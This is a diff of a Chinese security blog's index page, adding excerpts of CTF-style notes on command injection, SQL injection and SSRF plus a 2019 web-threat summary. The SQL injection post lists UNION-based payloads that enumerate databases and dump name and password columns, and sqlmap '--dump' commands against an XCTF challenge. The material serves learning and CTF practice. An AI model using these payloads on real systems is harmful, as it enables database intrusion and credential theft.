@@ -146,6 +146,349 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Command-Injection" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/08/09/Command-Injection/">Command Injection </a>
+    </h1>
+  
+
+        
+        <a href="/2019/08/09/Command-Injection/" class="archive-article-date">
+  	<time datetime="2019-08-09T01:35:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1><span id="命令注入">命令注入</span></h1><h2><span id="命令注入流程">命令注入流程</span></h2><ol>
+<li>是否调用系统命令</li>
+<li>函数的参数是否可控</li>
+<li>可控参数是否可控地拼接注入命令</li>
+</ol>
+<h2><span id="ampampamp-命令拼接符号的区别">&amp;，&amp;&amp;，| ，||命令拼接符号的区别</span></h2><p>A&amp;B：简单的拼接 A、B直接没有制约关系<br>A&amp;&amp;B：A执行成功才会执行B<br>A|B：A的输出，作为B的输入<br>A||B：A执行失败才会执行B</p>
+<h2><span id="无回显时">无回显时</span></h2><ol>
+<li>延时注入：</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>系统</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>windows</td>
+<td>ping 127.0.0.1 -n 5&gt;null</td>
+</tr>
+<tr>
+<td>linux</td>
+<td>sleep 5</td>
+</tr>
+</tbody>
+</table>
+<p>通过响应时间判断</p>
+<ol start="2">
+<li>远程请求</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>系统</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>windows</td>
+<td>ping,telnet等</td>
+</tr>
+<tr>
+<td>linux</td>
+<td>wget，curl等</td>
+</tr>
+</tbody>
+</table>
+<ol start="3">
+<li>dns查询</li>
+</ol>
+<h2><span id="fix">fix</span></h2><p>白名单<br>黑名单容易存在绕过 “”,’’</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/08/09/Command-Injection/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ByPassWAF思路" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/08/08/ByPassWAF思路/">ByPassWAF思路</a>
+    </h1>
+  
+
+        
+        <a href="/2019/08/08/ByPassWAF思路/" class="archive-article-date">
+  	<time datetime="2019-08-08T03:15:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="https://www.secpulse.com/archives/109577.html" target="_blank" rel="noopener">【思路/技术】某大佬的BypassWAF新思路</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/08/08/ByPassWAF思路/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-sql注入" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/08/08/sql注入/">sql注入</a>
+    </h1>
+  
+
+        
+        <a href="/2019/08/08/sql注入/" class="archive-article-date">
+  	<time datetime="2019-08-08T03:15:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="https://blog.csdn.net/wuqiongrj/article/details/51995016" target="_blank" rel="noopener">https://blog.csdn.net/wuqiongrj/article/details/51995016</a></p>
+<p>mysql 5.0版本以后提供了information.schema表，表中记录了数据库中所有的库、表、列等信息</p>
+<ol>
+<li><p>information.schema.schemata<br>SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表</p>
+</li>
+<li><p>information.schema.tables<br>TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表.</p>
+</li>
+<li><p>information.schema.columns<br>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，注释等。是show columns from schemaname.tablename的结果取之此表.</p>
+</li>
+</ol>
+<p>找到注入点后，我们用order by语句查询数据库中存在多少数据表<br>确定多少个表，为了便于说明，假设有三个数据表，<br>    Order by 3 返回正常<br>    order by 4返回错误<br>然后使用and 1=2 union select 1，2，3 %23爆出可以回显敏感信息的位置,假设在2和3上</p>
+<p>下面我们就要查询敏感信息了，就要用到上面所说的系统函数了</p>
+<p>可以爆出当前使用版本和数据库名<br>and 1=2 union select 1,version(),database()</p>
+<p>爆出数据库名，依次使用limit2，1往下爆库名，也可以使用group_concat函数全部爆出来<br>and 1=2 union select 1,2,schema_name from information_schema.schemata limit 1,1 %23<br>and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata%23 。</p>
+<p>我们假设其中有flag库<br>and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where schema_name=’flag’ </p>
+<p>爆出flag库下的所有的表，假设其中有flagtable表<br>and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name =’flagtale’</p>
+<p>爆出flagtable下的所有字段，假设有name和password字段<br>and 1=2 union select 1,2,group_concat(name,password) from flag.flagtable爆出flag下的flagtable表的name和password的内容</p>
+<blockquote>
+<p>例:联合查询(手动)</p>
+<ol>
+<li>查询当前数据库中的所有表名：<br>1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#<br><img src="https://img-blog.csdnimg.cn/20190330233925194.png" alt=""></li>
+<li>查询表中的列名：<br>1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’secret_table’#<br><img src="https://img-blog.csdnimg.cn/20190330233947770.png" alt=""></li>
+<li>得到flag：<br>1’ union select 1,2,fl4g from news.secret_table#<br><img src="https://img-blog.csdnimg.cn/20190330233843352.png" alt=""></li>
+</ol>
+</blockquote>
+<blockquote>
+<p>例:(sqlmap)<br>1.sqlmap -r xctfrequest.txt –dbs<br><img src="https://img-blog.csdnimg.cn/20190613184610888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70" alt=""><br>发现存在POST注入，继续深入<br>sqlmap -r xctfrequest.txt -D news –tables<br>sqlmap -r xctfrequest.txt -D news -T secret_table  –columns<br>sqlmap -r xctfrequest.txt -D news -T secret_table -C “id,fl4g” –dump<br>当然也可以一次性把new数据库内的内容全部爆出来，这样就不用一步步找flag在哪了，直接了当，所以对于有目的，好寻找的我们可以使用第一种步步深入；如果比较难找，就第二种方法比较好<br>sqlmap -r xctfrequest.txt -D news –dump<br><img src="https://img-blog.csdnimg.cn/20190613191841812.png" alt=""></p>
+</blockquote>
+<p>奇技淫巧</p>
+<ol>
+<li>上传文件名注入<br>利用上传文件名进行sql注入<br><img src="https://i.loli.net/2019/08/09/P47Cesx8OIEu2hQ.png" alt=""></li>
+</ol>
+<p><img src="https://i.loli.net/2019/08/09/g2KjkB987NpXShE.png" alt=""></p>
+<p><img src="https://i.loli.net/2019/08/09/XGFO2wA6YUcsrZg.png" alt=""></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/08/08/sql注入/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-2019安全态势" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/08/08/2019安全态势/">2019安全态势</a>
+    </h1>
+  
+
+        
+        <a href="/2019/08/08/2019安全态势/" class="archive-article-date">
+  	<time datetime="2019-08-08T02:09:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="https://www.secpulse.com/archives/110146.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/110146.html</a></p>
+<h1><span id="网站安全态势">网站安全态势</span></h1><p>攻击量持续增加，信息泄漏问题依然严峻</p>
+<p>根据深信服全网安全态势感知平台对全球44501个IP2019年上半年所受网络攻击进行监测数据显示，网站攻击数量整体呈上升趋势，其中攻击类型以网站扫描、信息泄漏和弱口令攻击等类型为主。</p>
+<p>上半年攻击趋势如下：<br><img src="https://www.secpulse.com/wp-content/uploads/2019/08/%E5%9B%BE%E7%89%8718.png" alt=""><br>主要网站攻击类型统计分布：<br><img src="https://www.secpulse.com/wp-content/uploads/2019/08/%E5%9B%BE%E7%89%8719.png" alt=""></p>
+<h2><span id="网站漏洞类型以webapp漏洞和web服务器漏洞为主">网站漏洞类型以Webapp漏洞和Web服务器漏洞为主</span></h2><p>通过深信服网站安全监测平台的数据分析，对国内上半年已授权的网站进行漏洞监控，2019年上半年收集的漏洞2522个，漏洞类别占比前三的分别是WebApp漏洞、Web服务器漏洞和Web_Activex漏洞。详细高危漏洞类型分布如下：<br><img src="https://www.secpulse.com/wp-content/uploads/2019/08/add.png" alt=""></p>
+<h2><span id="用户关注度较高的漏洞">用户关注度较高的漏洞</span></h2><p>根据用户查阅CNVD漏洞信息次数的统计结果，上半年用户关注度最高的5个漏洞如表所示。<br><img src="https://www.secpulse.com/wp-content/uploads/2019/08/%E5%9B%BE%E7%89%8727.png" alt=""></p>
+<h2><span id="高危漏洞类型以csrf跨站请求伪造为主">高危漏洞类型以CSRF跨站请求伪造为主</span></h2><p>深信服网站安全监测平台对国内上半年已授权的7087个站点进行漏洞监控，发现高危站点7689个，高危漏洞72308个，漏洞类别占比前三的分别是CSRF跨站请求伪造、信息泄漏和点击劫持。详细高危漏洞类型分布如下：<br><img src="https://www.secpulse.com/wp-content/uploads/2019/08/%E5%9B%BE%E7%89%8728.png" alt=""><br>具体比例如下：<br><img src="https://www.secpulse.com/wp-content/uploads/2019/08/%E5%9B%BE%E7%89%8729.png" alt=""></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/08/08/2019安全态势/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-CG-CTF-Web" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
@@ -187,6 +530,80 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2019/07/30/CG-CTF-Web/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-SSRF" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/25/SSRF/">SSRF</a>
+    </h1>
+  
+
+        
+        <a href="/2019/07/25/SSRF/" class="archive-article-date">
+  	<time datetime="2019-07-25T07:48:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1><span id="ssrf-server-side-request-forgery-服务端请求伪造">SSRF-Server-Side Request Forgery 服务端请求伪造</span></h1><p><a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html#0x01-ssrf" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html#0x01-ssrf</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/07/25/SSRF/">展开全文 >></a>
         </p>
       
 
@@ -277,80 +694,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2019/07/25/webshell-上传-解析漏洞/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SSRF" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/25/SSRF/">SSRF</a>
-    </h1>
-  
-
-        
-        <a href="/2019/07/25/SSRF/" class="archive-article-date">
-  	<time datetime="2019-07-25T07:48:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1><span id="ssrf-server-side-request-forgery-服务端请求伪造">SSRF-Server-Side Request Forgery 服务端请求伪造</span></h1><p><a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html#0x01-ssrf" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html#0x01-ssrf</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/07/25/SSRF/">展开全文 >></a>
         </p>
       
 
@@ -736,11 +1079,23 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">WriteUp,PHP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">WriteUP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">XCTF WriteUP</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">web php</a>
+                <a href="javascript:void(0)" class="js-tag color3">web,php</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">wp</a>
               </li>
             
             <div class="clearfix"></div>
